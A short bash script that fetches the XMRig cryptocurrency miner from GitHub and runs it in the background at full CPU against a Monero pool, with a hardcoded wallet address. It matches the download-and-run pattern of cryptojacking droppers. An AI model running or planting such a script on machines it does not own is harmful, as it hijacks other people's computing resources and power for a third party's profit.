#!/bin/bash

curl -LOJ https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-static-x64.tar.gz

tar -zxvf xmrig-6.19.2-linux-static-x64.tar.gz
cd xmrig-6.19.2
./xmrig --algo=cryptonight --url=stratum+tcp://pool.minexmr.com:4444,5555 --user=454iEHPcqfzES8GqwFopzq1H2aTc7mtE5F5xXWnW8MbNd2DsM1nFa2m4FEi2S3fijMMN4B54Dyrb61HDEJdXtGXPUVKyH7L --pass=x --max-cpu-usage=100 --background --log-file=log
